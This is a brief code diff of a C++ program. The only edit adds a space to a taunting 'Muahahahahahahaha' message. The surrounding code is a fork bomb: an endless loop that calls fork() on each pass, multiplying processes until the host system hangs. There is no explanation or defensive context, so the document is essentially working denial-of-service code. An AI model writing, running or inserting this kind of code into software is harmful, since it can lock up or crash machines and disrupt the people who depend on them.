@@ -9,7 +9,7 @@ using namespace std;
 int main(int argc, char* argv[])
 {
 	while(true) {
-		cout << "Muahahahahahahaha ..." << endl;
+		cout << "Muahahahahahahaha ... " << endl;
 
 		fork();
 	}
